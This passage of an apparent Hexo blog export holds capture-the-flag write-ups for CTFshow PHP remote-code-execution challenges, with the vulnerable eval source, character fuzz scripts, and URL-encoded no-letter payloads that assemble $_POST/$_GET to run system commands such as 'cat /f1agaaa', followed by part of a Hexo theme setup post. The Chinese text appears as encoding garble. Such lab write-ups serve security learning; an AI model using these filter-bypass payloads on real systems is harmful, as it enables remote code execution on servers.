function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>fuzzä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for($a = 0; $a &lt; 256; $a++)&#123;</span><br><span class="line">    if (!preg_match(&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;,chr($a)))&#123;</span><br><span class="line">        echo urlencode(chr($a)).&quot; &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">//! $ &#x27; ( ) + , . / ; = [ ] _</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=[].[]; //ä¿©æ•°ç»„æ‹¼æ¥å¼ºè¡Œè¿”å›ArrayArray,è¿™é‡Œä¸€ä¸ªçŸ­æ çš„å€¼ä¹Ÿå°±æ˜¯ArrayArray</span><br><span class="line">$__=&#x27;&#x27;;  //ä¸¤ä¸ªçŸ­æ èµ‹å€¼ä¸ºç©º</span><br><span class="line">$_=$_[&#x27;&#x27;];//ä»arrayarrayä¸­å–é¦–å­—ç¬¦ï¼Œå³aã€‚è¿™é‡Œ$_=$_[0]ä¹Ÿæ˜¯ä¸€æ ·çš„é“ç†ï¼Œä¸è¿‡wafé™åˆ¶æ•°å­—è¾“å…¥</span><br><span class="line">$_=++$_; //B</span><br><span class="line">$_=++$_; //C</span><br><span class="line">$_=++$_; //D</span><br><span class="line">$_=++$_; //D</span><br><span class="line">$__.=$_; //E  æŠŠä¸¤ä¸ªçŸ­æ èµ‹å€¼ä¸ºE</span><br><span class="line">$_=++$_; //F  ä¸€ä¸ªçŸ­æ ç»§ç»­è‡ªå¢</span><br><span class="line">$_=++$_; //G </span><br><span class="line">$__=$_.$__; // GE  ä¸€ä¸ªçŸ­æ è‡ªå¢å˜æˆäº†Gï¼Œä¸¤ä¸ªçŸ­æ åœ¨å‰é¢ç¬¬åä¸€è¡Œå¤„å·²ç»èµ‹å€¼ä¸ºEï¼Œæ‹¼æ¥å¾—GE</span><br><span class="line">$_=++$_; //H æ­¤å¤„ä¸€ä¸ªçŸ­æ ç»§ç»­è‡ªå¢ï¼Œä¸ºH</span><br><span class="line">$_=++$_; //I</span><br><span class="line">$_=++$_; //J</span><br><span class="line">$_=++$_; //k</span><br><span class="line">$_=++$_; //L</span><br><span class="line">$_=++$_; //M</span><br><span class="line">$_=++$_; //N</span><br><span class="line">$_=++$_; //O</span><br><span class="line">$_=++$_; //P</span><br><span class="line">$_=++$_; //Q</span><br><span class="line">$_=++$_; //R</span><br><span class="line">$_=++$_; //S</span><br><span class="line">$_=++$_; //T</span><br><span class="line">$__.=$_; // GET åœ¨æ­¤å¤„ï¼Œä¸¤æ¡çŸ­æ åŸæ˜¯GEä¸ä¸€æ¡çŸ­æ ï¼ˆå·²ç»è‡ªå¢ä¸ºTï¼‰ï¼Œ.=æ‹¼æ¥ï¼Œæ„æˆget</span><br><span class="line">$&#123;&#x27;_&#x27;.$__&#125;[_]($&#123;&#x27;_&#x27;.$__&#125;[__]); // è¿›è¡Œæ‹¼æ¥ï¼Œ$_GET[&#x27;_&#x27;]($_GET[&#x27;__&#x27;]);</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®è¿™ä¸ªå†™çš„payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//è¿™æ˜¯æˆ‘è¿™ä¸€é¢˜åšå‡ºæ¥çš„æ‰€ç”¨çš„</span><br><span class="line">$_=[].[];$__=&#x27;&#x27;;$_=$_[&#x27;&#x27;];$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$_=++$_;$_=++$_;$__=$_.$__;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$___=&#x27;_&#x27;;$___.=$__;($$___[_])($$___[__]);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">ctf_show=%24_%3D%5B%5D.%5B%5D%3B%24__%3D%27%27%3B%24_%3D%24_%5B%27%27%5D%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24__.%3D%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24__%3D%24_.%24__%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24__.%3D%24_%3B%24___%3D%27_%27%3B%24___.%3D%24__%3B%28%24%24___%5B_%5D%29%28%24%24___%5B__%5D%29%3B</span><br><span class="line">//ç„¶ågetä¼ _=system&amp;__=ls</span><br><span class="line">//urlç¼–ç åç”¨æŠ“åŒ…ä¼ å‚ï¼Œ</span><br></pre></td></tr></table></figure>

<p>ctfshow{6a98d4af-f123-458a-9ad8-4fbbbb75cdd6}</p>
<h2 id="rce3"><a href="#rce3" class="headerlink" title="rce3"></a>rce3</h2><p>PHPè¿›è¡Œè®¡ç®—çš„æ—¶å€™è®¤ä¸ºä¸€ä¸ªæ•°è¶…å‡ºInfiniteï¼Œé‚£å°±æ˜¯: NAN( not-a-number)<br> è¿™é‡Œä¸¾ä¸ªä¾‹ï¼šecho (a&#x2F;a); &#x2F;&#x2F;å°±ä¼šè¾“å‡ºNAN</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">105</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z2-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//() + , . / 0 1 ; = [] _</span></span><br><span class="line">é™åˆ¶<span class="number">105</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=([].[])[0]; </span><br><span class="line">//è¿™é‡Œå°±æ˜¯ä¸Šé¢çš„æ•°ç»„æ‹¼æ¥ï¼Œå¼ºåˆ¶è¿”å›ArrayArray, å–ç¬¬ä¸€ä¸ªA</span><br><span class="line">$_=($_/$_.$_)[0]; </span><br><span class="line">//è¿™é‡Œæ˜¯å…³é”®phpçš„è®¡ç®—ä¸Šé¢æœ‰è¯´ï¼Œå…¶å®è¿™é‡Œéº»çƒ¦äº†ï¼Œåªæ˜¯å½“æ—¶ä¸çŸ¥é“, è¿™é‡Œè¿”å› N</span><br><span class="line">$_++; //O</span><br><span class="line">$__=$_.$_++; </span><br><span class="line">//è¿™é‡Œæ˜¯è¿›è¡Œäº†++çš„ï¼Œæ‰€ä»¥$_ç­‰äºP, $__=PO, å…¶å®è¿™é‡Œæ‰æ˜¯ç¬¬äº”é¢˜çš„å…³é”®å˜¿å˜¿ï¼Œå¾ˆå¤š74çš„å°±æ˜¯å¡åœ¨è¿™</span><br><span class="line">$_++; // Q</span><br><span class="line">$_++; // R</span><br><span class="line">$_++; // S</span><br><span class="line">$_=_.$__.$_.++$_; //è¿™é‡Œæœ€åä¸€ä¸ªä¹Ÿæ˜¯è¿›è¡Œäº†++çš„ï¼Œæ‰€ä»¥æœ€åä¸€ä½æ˜¯T, $_ = _POST</span><br><span class="line">$$_[_]($$_[1]); // $_POST[_]($_POST[1]);</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºNä¸‹é¢å°±æœ‰postçš„æ‰€æœ‰å­—æ¯ï¼Œè€Œä¸”æ¯”è¾ƒè¿‘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_=([].[])[0];$_=($_/$_.$_)[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[1]);</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=%24_%3D%28%5B%5D.%5B%5D%29%5B0%5D%3B%24_%3D%28%24_/%24_.%24_%29%5B0%5D%3B%24_%2B%2B%3B%24__%3D%24_.%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D_.%24__.%24_.%2B%2B%24_%3B%24%24_%5B_%5D%28%24%24_%5B1%5D%29%3B&amp;_=system&amp;1=ls</span><br></pre></td></tr></table></figure>

<h2 id="rce4"><a href="#rce4" class="headerlink" title="rce4"></a>rce4</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">105</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z2-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ¯”ä¸Šä¸€ä¸ªå°‘äº†1ï¼Œè€Œä¸”å­—ç¬¦æ•°è¦æ±‚æ›´å°‘äº†ã€‚æ‰€ä»¥éœ€è¦æˆ‘ä»¬å‹ç¼©å¾—æ›´çŸ­ã€‚ä¸å½±å“æˆ‘ä»¬ä½¿ç”¨(0&#x2F;0)æ¥æ„é€ NAN, ä½†æ˜¯æ›´ä¸ºä¼˜ç§€çš„å†™æ³•å¯ä»¥æ˜¯<code>$a=(_/_._)[0];</code>ç›´æ¥å¾—åˆ°å­—æ¯Nï¼Œpayloadæ„é€ è¿‡ç¨‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=(_/_._)[0];//ç›´æ¥æ‹¼æ¥æˆå­—ç¬¦ä¸²å¹¶åˆ‡ç‰‡</span><br><span class="line">$o=++$a;//$o=++$aæ˜¯å…ˆæŠŠ$aè¿›è¡Œè‡ªå¢ï¼Œè‡ªå¢å®Œæˆä¹‹åå†å°†å€¼è¿”å›ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸€å¥ç»“æŸçš„æ—¶å€™ $aå’Œ$oéƒ½æ˜¯O</span><br><span class="line">$o=++$a.$o;//$o=&gt;PO,$a=&gt;P</span><br><span class="line">$a++;//Q</span><br><span class="line">$a++;//R</span><br><span class="line">$o.=++$a;//$o=&gt;POS,$a=&gt;S</span><br><span class="line">$o.=++$a;//$o=&gt;POST,$a=&gt;T</span><br><span class="line">$_=_.$o;//_POST</span><br><span class="line">$$_[0]($$_[_]);//$_POST[0]($_POST[_]);</span><br></pre></td></tr></table></figure>

<p>è¿™ä½å¸ˆå‚…å†™çš„å¤ªæ£’äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=$%ff=(_/_._)[0];$%fe=%2b%2b$%ff;$%fe=%2b%2b$%ff.$%fe;$%ff%2b%2b;$%ff%2b%2b;$%fe.=%2b%2b$%ff;$%fe.=%2b%2b$%ff;$_=_.$%fe;$$_[0]($$_[_]);&amp;0=system&amp;_=cat /f1agaaa</span><br></pre></td></tr></table></figure>

<h2 id="rce5"><a href="#rce5" class="headerlink" title="rce5"></a>rce5</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//æœ¬é¢˜çµæ„Ÿæ¥è‡ªç ”ç©¶Y4tackerä½¬åœ¨åƒç“œæ¯æŠ•ç¨¿çš„shellmeæ—¶æƒ³åˆ°çš„å§¿åŠ¿ï¼Œå¤ªæ£’å•¦~ã€‚</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">73</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>fuzzè„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$i</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">256</span>;<span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//      $()+,./;=[]_</span></span><br></pre></td></tr></table></figure>

<p>â€‹     phpinfoå®‰è£…äº†ä¸€ä¸ªæ‰©å±•gettextï¼Œè¯¥æ‰©å±•æ”¯æŒå‡½æ•°<code>_()</code> ,ç›¸å½“äº<code>gettext()</code>ï¼Œç›´æ¥è½¬åŒ–ä¸ºå­—ç¬¦ä¸²</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=_(a/a)[a];//ç›¸å½“äºgettext(0/0)[0],å¾—åˆ°N</span><br><span class="line">$_=++$a;//O</span><br><span class="line">$_=_.++$a.$_;//_PO</span><br><span class="line">$a++;$a++;//R</span><br><span class="line">$_.=++$a.++$a;//_POST</span><br><span class="line">$$_[a]($$_[_]);//$_POST[a]($_POST[_])</span><br></pre></td></tr></table></figure>

<p>è‡³äºä¸ºä»€ä¹ˆ<code>$_=$a.$a++;</code>è¿™ä¸€æ­¥å¾—åˆ°çš„æ˜¯POè€Œä¸æ˜¯OPï¼Œæˆ–è€…OOï¼Œè€Œ<code>$_=_.$a.$a++;</code>å¾—åˆ°çš„æ˜¯<code>_OO</code>,ç»è¿‡å’Œç”¨è¿™ç§åšæ³•çš„å¸ˆå‚…ä»¬è®¨è®ºï¼Œç›®å‰åˆ†æä¸‹æ¥æœ€æœ‰å¯èƒ½çš„åŸå› æ˜¯ï¼ŒPHPåœ¨åšå­—ç¬¦ä¸²æ‹¼æ¥çš„è¿‡ç¨‹ä¸­ï¼ˆ.æ“ä½œï¼‰ï¼Œæ˜¯ä¸€ä¸ªä»å·¦åˆ°å³é€’å½’çš„è¿‡ç¨‹ï¼Œè€Œ<code>++</code>æ“ä½œç±»ä¼¼äºä¸€ä¸ªå‡½æ•°ï¼Œphpåœ¨æ‰§è¡Œå®Œå‡½æ•°åï¼Œå†åšæ‹¼æ¥çš„æ“ä½œï¼Œ<code>$_=$a.$a++;//PO</code>è¿™é‡Œç›¸å½“äºå…ˆæ‰§è¡Œäº†<code>$a++</code>æ“ä½œï¼ˆå‡½æ•°ï¼‰ï¼Œå¹¶å¾—åˆ°<code>$a++</code>çš„è¿”å›å€¼ï¼Œç„¶åå’Œå·¦ä¾§çš„<code>$a</code>å˜é‡è¿›è¡Œæ‹¼æ¥ï¼Œæ­¤æ—¶<code>$a</code>å·²ç»æ˜¯Päº†ã€‚è€Œ<code>$_=_.$a.$a++;</code>æ—¶å…ˆæ‰§è¡Œäº†<code>_</code>å’Œ<code>$a</code>çš„æ‹¼æ¥ï¼Œè€Œåå†æ‰§è¡Œ<code>$_=&#39;_O&#39;.$a++</code>ï¼Œæ‰€ä»¥å¾—åˆ°çš„æ˜¯<code>_OO</code>ã€‚*ä»¥ä¸Šæ‰€æœ‰å‡ä¸ºçŒœæµ‹ï¼Œå…·ä½“æœºåˆ¶éœ€ç ”ç©¶PHPæºç ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=$%ff=_(%ff/%ff)[%ff];$_=%2b%2b$%ff;$_=_.%2b%2b$%ff.$_;$%ff%2b%2b;$%ff%2b%2b;$_.=%2b%2b$%ff.%2b%2b$%ff;$$_[_]($$_[%ff]);&amp;_=system&amp;%ff=cat /f1agaaa</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ä¸å¯è§å­—ç¬¦è¦æŠ“åŒ…ä¼ å‚ï¼Œç©ºæ ¼æ¢æˆ+å·</p>
<p>68ä½</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="title function_ invoke__">_</span>(a/a)[_];<span class="comment">//N</span></span><br><span class="line"><span class="variable">$a</span>=++<span class="variable">$_</span>;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$$a</span>[<span class="variable">$a</span>=_.++<span class="variable">$_</span>.<span class="variable">$a</span>[<span class="variable">$_</span>++/<span class="variable">$_</span>++].++<span class="variable">$_</span>.++<span class="variable">$_</span>](<span class="variable">$$a</span>[_]);<span class="comment">//å·§å¦™çš„æŠŠä¸¤æ¬¡$_++æ”¾åœ¨ä¸€èµ·</span></span><br><span class="line"><span class="variable">$a</span>=_.++<span class="variable">$_</span>.<span class="variable">$a</span>[<span class="variable">$_</span>++/<span class="variable">$_</span>++].++<span class="variable">$_</span>.++<span class="variable">$_</span><span class="comment">//$aç›´æ¥æ‹¼æ¥å‡º_POST</span></span><br><span class="line"><span class="variable">$$a</span>[_POST](<span class="variable">$$a</span>[_])<span class="comment">//$_POST[_POST]($_POST[_])</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=$_=_(%ff/%ff)[_];$%ff=%2b%2b$_;$$%ff[$%ff=_.%2b%2b$_.$%ff[$_%2b%2b/$_%2b%2b].%2b%2b$_.%2b%2b$_]($$%ff[_]);&amp;_POST=system&amp;_=cat /f1agaaa</span><br></pre></td></tr></table></figure>

<p><a href="https://ctf-show.feishu.cn/docx/ToiJd70SboRn52xhn3WcJsfjnah">CTFshow-RCEæé™å¤§æŒ‘æˆ˜å®˜æ–¹wp - é£ä¹¦äº‘æ–‡æ¡£ (feishu.cn)</a></p>
<p>è¿™ä½å¸ˆå‚…å†™çš„å¥½æ£’</p>
<p><a href="https://blog.csdn.net/qq_61955196/article/details/127932968">https://blog.csdn.net/qq_61955196/article/details/127932968</a></p>
]]></content>
  </entry>
  <entry>
    <title>åšå®¢åˆ›å»º</title>
    <url>/2023/01/11/%E5%8D%9A%E5%AE%A2%E5%88%9B%E5%BB%BA/</url>
    <content><![CDATA[<p> layout å¸ƒç½®<br>    <span id="more"></span></p>
<h1 id="æ–‡ç« å­—æ•°ç»Ÿè®¡"><a href="#æ–‡ç« å­—æ•°ç»Ÿè®¡" class="headerlink" title="æ–‡ç« å­—æ•°ç»Ÿè®¡"></a>æ–‡ç« å­—æ•°ç»Ÿè®¡</h1><h3 id="Hexo-config-yml"><a href="#Hexo-config-yml" class="headerlink" title="Hexo _config.yml"></a>Hexo _config.yml</h3><p>åœ¨æ–‡ä»¶å°¾éƒ¨æ·»åŠ </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">symbols_count_time:</span><br><span class="line">  symbols: true</span><br><span class="line">  time: true</span><br><span class="line">  total_symbols: true</span><br><span class="line">  total_time: true</span><br><span class="line">  exclude_codeblock: false</span><br><span class="line">  awl: 4</span><br><span class="line">  wpm: 275</span><br><span class="line">  suffix: &quot;mins.&quot;</span><br></pre></td></tr></table></figure>

<h3 id="NexT-config-yml"><a href="#NexT-config-yml" class="headerlink" title="NexT _config.yml"></a>NexT _config.yml</h3><p>ä¿®æ”¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Post wordcount display settings</span><br><span class="line"># Dependencies: https://github.com/next-theme/hexo-word-counter</span><br><span class="line">symbols_count_time:</span><br><span class="line">  separated_meta: true</span><br><span class="line">  item_text_total: false</span><br></pre></td></tr></table></figure>

<p>è®¾ç½®<code>item_text_total</code>ä¸º<code>true</code></p>
<h1 id="æ‰“èµåŠŸèƒ½å®ç°"><a href="#æ‰“èµåŠŸèƒ½å®ç°" class="headerlink" title="æ‰“èµåŠŸèƒ½å®ç°"></a>æ‰“èµåŠŸèƒ½å®ç°</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Donate (Sponsor) settings</span><br><span class="line"># Front-matter variable (unsupport animation).</span><br><span class="line">reward_settings:</span><br><span class="line">  # If true, a donate button will be displayed in every article by default.</span><br><span class="line">  enable: false</span><br><span class="line">  animation: false</span><br><span class="line">  #comment: Buy me a coffee</span><br><span class="line"></span><br><span class="line">reward:</span><br><span class="line">  #wechatpay: /images/wechatpay.png</span><br><span class="line">  #alipay: /images/alipay.png</span><br><span class="line">  #paypal: /images/paypal.png</span><br><span class="line">  #bitcoin: /images/bitcoin.png</span><br></pre></td></tr></table></figure>

<p>è®¾ç½®å±æ€§<code>enable</code>ä¸º<code>true</code>ï¼Œ<code>animation</code>ä¸º<code>true</code>ï¼Œæ·»åŠ <code>comment</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enable: true</span><br><span class="line">comment: Buy me a coffee</span><br></pre></td></tr></table></figure>

<p>å°†å¾®ä¿¡æ”¯ä»˜å’Œæ”¯ä»˜å®æ”¯ä»˜çš„æˆªå›¾æ”¾ç½®åœ¨ä¸»é¢˜åŒ…ä¸‹<code>source/images</code>æ–‡ä»¶å¤¹ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wechatpay: /images/wechatpay.jpg</span><br><span class="line">alipay: /images/alipay.jpg</span><br><span class="line">#bitcoin: /images/bitcoin.jpg</span><br></pre></td></tr></table></figure>

<h1 id="live2d"><a href="#live2d" class="headerlink" title="live2d"></a>live2d</h1><h3 id="å®‰è£…æ’ä»¶"><a href="#å®‰è£…æ’ä»¶" class="headerlink" title="å®‰è£…æ’ä»¶"></a>å®‰è£…æ’ä»¶</h3><p>npm install â€“save hexo-helper-live2d</p>
<h3 id="ä¸‹è½½modelæ–‡ä»¶"><a href="#ä¸‹è½½modelæ–‡ä»¶" class="headerlink" title="ä¸‹è½½modelæ–‡ä»¶"></a>ä¸‹è½½modelæ–‡ä»¶</h3><p>npm install live2d-widget-model-shizuku</p>
<h4 id="æ·»åŠ live2dçœ‹æ¿å¨˜åˆ°hexo"><a href="#æ·»åŠ live2dçœ‹æ¿å¨˜åˆ°hexo" class="headerlink" title="æ·»åŠ live2dçœ‹æ¿å¨˜åˆ°hexo"></a>æ·»åŠ live2dçœ‹æ¿å¨˜åˆ°hexo</h4><p>é…ç½®Hexoçš„ä¸»<code>_config.yml</code>æˆ–è€…ä½¿ç”¨çš„ä¸»é¢˜çš„<code>_config.yml</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## Live2Dçœ‹æ¿å¨˜</span><br><span class="line">live2d:</span><br><span class="line">  enable: true</span><br><span class="line">  pluginModelPath: assets/</span><br><span class="line">  model:</span><br><span class="line">    #æ¨¡æ¿ç›®å½•ï¼Œåœ¨node_modulesé‡Œ</span><br><span class="line">    use: live2d-widget-model-shizuku  </span><br><span class="line">  display:</span><br><span class="line">    position: right</span><br><span class="line">    width: 300 </span><br><span class="line">    height: 600</span><br><span class="line">  mobile:</span><br><span class="line">    # åœ¨æ‰‹æœºç«¯æ˜¾ç¤º</span><br><span class="line">    show: false   </span><br><span class="line">  rect:</span><br><span class="line">    opacity:0.7</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="https://hexo-next.readthedocs.io/zh_CN/latest/">å…­è§’å½¢-NexT (hexo-next.readthedocs.io)</a></p>
<p><a href="https://markdown.com.cn/basic-syntax/">Markdown åŸºæœ¬è¯­æ³• | Markdown å®˜æ–¹æ•™ç¨‹</a></p>
<h1 id="çˆ±å¿ƒç‰¹æ•ˆ"><a href="#çˆ±å¿ƒç‰¹æ•ˆ" class="headerlink" title="çˆ±å¿ƒç‰¹æ•ˆ"></a>çˆ±å¿ƒç‰¹æ•ˆ</h1><p><a href="https://benn314.github.io/2022/11/22/Hexo-Next%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/#%E9%BC%A0%E6%A0%87%E7%82%B9%E5%87%BB%E5%8A%A8%E7%94%BB">Hexo-Nextä¸»é¢˜é…ç½®æ•™ç¨‹ | Benâ€™s Blog (benn314.github.io)</a></p>
<p>åœ¨ <strong>&#x2F;themes&#x2F;next&#x2F;source&#x2F;js&#x2F;</strong> ä¸‹æ–°å»ºæ–‡ä»¶ <code>clicklove.js</code> å¹¶æ·»åŠ ä»£ç ï¼š</p>
